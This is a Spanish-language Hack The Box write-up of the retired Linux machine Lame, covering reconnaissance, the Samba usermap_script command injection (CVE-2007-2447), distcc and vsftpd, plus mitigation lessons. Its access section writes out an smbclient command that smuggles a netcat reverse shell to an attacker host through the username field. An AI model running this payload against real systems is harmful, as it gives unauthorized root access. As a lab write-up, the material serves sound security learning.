---
machine: Lame
os: Linux
difficulty: Easy
platform: Hack The Box
category: SMB / Servicios antiguos
state: Retired
tags: [samba, usermap_script, distcc, vsftpd, cve-2007-2447]
---

# Lame — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

La primera máquina publicada en la plataforma. Un **Samba 3.0.20** con `usermap_script` (CVE-2007-2447) da **root directo** sin autenticación: el nombre de usuario se pasa a un script de shell, así que una comilla con `;` ejecuta comandos. `vsftpd 2.3.4` y `distcc` son las otras dos puertas conocidas.

## Reconocimiento

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
21/tcp   open  ftp      vsftpd 2.3.4
22/tcp   open  ssh      OpenSSH 4.7p1
139/tcp  open  netbios-ssn   Samba smbd 3.0.20-Debian
445/tcp  open  netbios-ssn   Samba smbd 3.0.20-Debian
3632/tcp open  distccd  distccd v1
```

## Acceso

**Samba `usermap_script` (CVE-2007-2447)** — el vector con root:

```bash
# el usuario se interpola en un script de shell sin sanear
smbclient //<IP>/tmp -N -U '=/=`nohup nc -e /bin/sh <LHOST> 4444`'
```

Alternativa con Metasploit: `exploit/multi/samba/usermap_script`.

**distcc (CVE-2004-2687)** — ejecución como `daemon`:

```bash
# módulo: exploit/unix/misc/distcc_exec
```

**`vsftpd 2.3.4`** — el backdoor del `:)` es un clásico, pero en esta caja el puerto 6200 no responde de forma fiable: es un señuelo.

## Escalada

Por Samba la sesión ya es `uid=0`. Por `distcc` se entra como `daemon` y hace falta enumerar privilegios locales:

```bash
id; uname -a; ls -la /home; find / -perm -4000 -type f 2>/dev/null
```

## Tropiezos

- **`vsftpd`**: perder tiempo en el backdoor cuando el puerto 6200 está filtrado.
- **SMB moderno**: un cliente actual puede rechazar el dialecto; usar `-m SMB2` o el módulo de MSF.
- **Payloads**: la reverse shell va dentro del nombre de usuario; las comillas y el escape son la mitad del trabajo.

## Lecciones

- Un servicio de 2007 en 2017 es una invitación: versiones → CVEs públicos.
- En `usermap_script` el fallo es de **inyección de comandos** en la cadena de usuario.
- `distcc` expuesto es ejecución remota sin credenciales.
- Mitigación: Samba actualizado, `distcc` no expuesto y `vsftpd` fuera de producción.
